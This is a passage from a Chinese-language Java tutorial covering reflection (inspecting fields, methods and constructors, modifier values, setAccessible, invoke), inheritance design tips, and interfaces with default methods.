title="利用反射分析类的能力"></a>利用反射分析类的能力</h4><p>在<code>java.lang.reflect</code>包中有三个类<code>Field、Method和Constructor</code>分别用于描述类的字段、方法和构造器。这三个类都有一个叫做<code>getName</code>的方法，用来返回字段、方法或构造器的名称。</p><p><code>Field</code>类中有<code>getType</code>方法用来返回描述字段类型的一个对象。<code>Method</code>和<code>Constructor</code>也有报告参数类型的方法：<code>getParameterTypes</code>。<code>Method</code>类还有一个报告返回类型的方法<code>getReturnType</code>。</p><p>这三个类都有一个名为<code>getModifiers</code>的方法，它将返回一个整数，用不同的0&#x2F;1位描述所使用的修饰符，如public和static。还可以利用<code>Modifier.toString</code>方法将修饰符打印出来。</p><table><thead><tr><th>修饰符</th><th>对应的int类型</th></tr></thead><tbody><tr><td>public</td><td>1</td></tr><tr><td>private</td><td>2</td></tr><tr><td>protected</td><td>4</td></tr><tr><td>static</td><td>8</td></tr><tr><td>final</td><td>16</td></tr><tr><td>synchronized</td><td>32</td></tr><tr><td>volatile</td><td>64</td></tr><tr><td>transient</td><td>128</td></tr><tr><td>native</td><td>256</td></tr><tr><td>interface</td><td>512</td></tr><tr><td>abstract</td><td>1024</td></tr><tr><td>strict</td><td>2048</td></tr></tbody></table><p><code>Class</code>类中的<code>getFields</code>、<code>getMethods</code>和<code>getConstructors</code>方法将分别返回这个类支持的<strong>公共</strong>字段、方法和构造器的数组，其中包括超类的<strong>公共</strong>成员。</p><p><code>Class</code>类的<code>getDeclareFields</code>、<code>getDeclareMethods</code>和<code>getDeclaredConstructors</code>方法将分别返回类中声明的全部字段、方法和构造器的数组，其中包括私有成员、包成员和受保护成员，<strong>但不包括超类的成员</strong> 。</p><p>下面这个程序显示如何打印一个类的全部信息：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>javalearn</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Modifier</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionTest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ReflectiveOperationException</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> supercl <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"class "</span> <span class="token operator">+</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>supercl <span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> supercl <span class="token operator">!=</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" extends "</span> <span class="token operator">+</span> supercl<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n&#123;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printConstructors</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printMethods</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printFields</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printConstructors</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Constructor</span> c<span class="token operator">:</span>constructors<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>paramTypes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>paramTypes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printMethods</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m <span class="token operator">:</span>methods<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> retType <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>retType<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>paramTypes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>paramTypes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printFields</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Field</span> e<span class="token operator">:</span>fields<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> type <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span> <span class="token operator">+</span> name<span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="使用反射在运行时分析对象"><a href="#使用反射在运行时分析对象" class="headerlink" title="使用反射在运行时分析对象"></a>使用反射在运行时分析对象</h4><p>要想查看字段的具体内容，关键方法是<code>Field</code>类中的<code>get</code>方法。如果<code>f</code>是一个<code>Field</code>类型的对象（例如，通过<code>getDeclaredFields</code>得到的对象），<code>obj</code>是某个包含<code>f</code>字段的类的对象，<code>f.get(obj)</code>将返回一个对象，其值为<code>obj</code>的当前字段值。</p><p>此外，<code>f.set(obj,value)</code>将把对象<code>obj</code>的<code>f</code>表示的字段设置为新值<code>value</code>。</p><p>但是这有一个问题，如果那个字段是私有字段，<code>get</code>和<code>set</code>会抛出一个<code>IllegalAccessException</code>。只能对可以访问的字段使用<code>get</code>和<code>set</code>方法。</p><p>反射机制的默认行为受限于<code>Java</code>的访问控制。不过，可以调用<code>Field</code>、<code>Method</code>或<code>Constructor</code>对象的<code>setAccessible</code>方法覆盖<code>Java</code>的访问控制：</p><pre class="language-java" data-language="java"><code class="language-java">f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>setAccessible</code>方法是<code>AccessibleObejct</code>类的一个方法，它是<code>Field</code>、<code>Method</code>和<code>Constructor</code>类的公共超类。这个特性是为调式、持久存储和类似机制提供的。</p><p>所以具体获得一个字段的代码可以是这样：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> feng<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> f <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"salary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> v <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="调用任意方法和构造器"><a href="#调用任意方法和构造器" class="headerlink" title="调用任意方法和构造器"></a>调用任意方法和构造器</h4><p>可以用<code>Field</code>类的<code>get</code>方法查看一个对象的字段。与之类似，<code>Method</code>类有一个<code>invoke</code>方法，允许你调用包装在当前<code>Method</code>对象中的方法。<code>invoke</code>方法的签名：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> invoke <span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span></code></pre><p>第一个参数是隐式参数，其余的对象提供显示参数。对于静态方法，第一个参数可以忽略，即可以把它设置为null。</p><p>如果返回类型是基本类型，<code>invoke</code>方法会返回其包装器类型。</p><p>想要得到<code>Method</code>对象的话，可以调用<code>getDeclareMethods</code>方法，也可以调用<code>Class</code>类的<code>getMethod</code>方法或<code>getDeclaredMethod</code>方法。不过，有可能存在若干个同名的方法，因此要准确地得到想要的那个方法，<strong>必须提供想要的方法的参数类型</strong>。<code>getMethod</code>的签名：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Method</span> <span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span></code></pre><p>所以得到那个方法可能还需要提供方法签名。之后调用<code>invoke</code>方法即可调用：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> method <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>feng<span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以使用类似的方法调用任意的构造器。将构造器的参数类型提供给<code>Class.getConstructor</code>方法，并把参数值提供给<code>Constructor.newInstance</code>方法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> cl  <span class="token operator">=</span> <span class="token class-name">Employee</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> cons <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> cons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> feng <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//feng</span></code></pre><h3 id="继承的设计技巧"><a href="#继承的设计技巧" class="headerlink" title="继承的设计技巧"></a>继承的设计技巧</h3><ol><li>将公共操作和字段放在超类中。</li><li>不要使用受保护的字段。</li><li>使用继承实现”is-a”关系。</li><li>除非所有继承的方法都有意义，否则不要使用继承。</li><li>在覆盖方法时，不要改变预期的行为。</li><li>使用多态，而不要使用类型信息。</li><li>不要滥用反射。</li></ol><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>接口用来描述类应该做什么，而不指定它们具体应该怎么做。</p><p>接口中的所有方法都自动是<code>public</code>方法。因此，在接口中声明方法时，不必提供关键字<code>public</code>。</p><p>接口可以定义常量，但是接口<strong>绝不会</strong>有实例字段。</p><p>提供实例字段和方法实现的任务应该由实现接口的那个类来完成。因此，可以将接口看成是没有实例字段的抽象类。（但是两个概念还是有一定区别的）</p><p>让类实现一个接口，通常需要完成下面两个步骤：</p><ol><li>将类声明为实现给定的接口。</li><li>对接口中的所有方法提供定义。</li></ol><p>要将类声明为实现某个接口，需要使用关键字<code>implements</code>。</p><blockquote><p>在接口声明中，没有将<code>compareTo</code>方法声明为<code>public</code>，这是因为在接口中的所有方法都自动是<code>public</code>。不过，在实现接口时，必须把方法声明为<code>public</code>；否则，编译器将认为这个方法的访问属性是包可见性，这是类的默认访问属性。</p></blockquote><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> other<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>salary<span class="token punctuation">,</span>other<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token comment">//在Java5中，Comparable接口已经提升为一个泛型类型。</span><span class="token comment">/*public interface Comparable&lt;T>&#123;int compare(T other);&#125;*/</span></code></pre><h4 id="接口的属性"><a href="#接口的属性" class="headerlink" title="接口的属性"></a>接口的属性</h4><p>接口不是类。具体地说，不能使用<code>new</code>运算符实例化一个接口。</p><p>尽管不能构造接口的对象，却能声明接口的变量。接口变量也必须引用实现了这个接口的类对象：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Comparable</span> x<span class="token punctuation">;</span>x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>也可以用<code>instanceof</code>检查一个对象是否实现了某个特定的接口。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Employee</span> feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>feng <span class="token keyword">instanceof</span> <span class="token class-name">Comparable</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>与建立类的继承层次一样，也可以拓展接口。</p><p>虽然在接口中不能包含实例字段，但是可以包含常量。 </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Moveable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">,</span> <span class="token keyword">double</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> <span class="token constant">SPEED_LIMIT</span><span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>与接口中的方法都自动被设置为<code>public</code>一样，接口中的字段总是<code>public static final</code>。</p><p>尽管每个类只能有一个超类，但却可以实现多个接口。可以使用逗号将想要实现的各个接口分隔开。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Employee</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span><span class="token punctuation">,</span> <span class="token class-name">Comparable</span></code></pre><p>实际上，接口可以提供多重继承的大多数好处，同时还能避免多重继承的复杂性和低效性。</p><h4 id="默认方法"><a href="#默认方法" class="headerlink" title="默认方法"></a>默认方法</h4><p>可以为接口提供一个默认实现。必须用<code>default</code>修饰符标记这样一个方法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token keyword">default</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">T</span> other<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>默认方法可以调用其他方法。</p><h4 id="解决默认方法冲突"><a href="#解决默认方法冲突" class="headerlink" 